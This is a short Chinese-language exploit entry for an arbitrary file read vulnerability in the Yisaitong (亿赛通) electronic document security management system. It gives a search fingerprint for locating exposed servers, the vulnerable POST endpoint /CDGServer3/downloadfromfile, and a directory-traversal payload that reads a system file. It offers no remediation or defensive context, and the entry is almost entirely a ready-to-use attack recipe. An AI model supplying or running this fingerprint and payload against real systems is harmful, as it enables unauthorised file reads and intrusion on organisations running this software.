# 亿赛通电子文档安全管理系统downloadfromfile存在任意文件读取漏洞

亿赛通电子文档安全管理系统 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="/CDGServer3/index.jsp"`
- **请求**：`POST /CDGServer3/downloadfromfile HTTP/1.1`

**Payload**
```
fileName=../../../../../../../../../../../windows/win.ini
```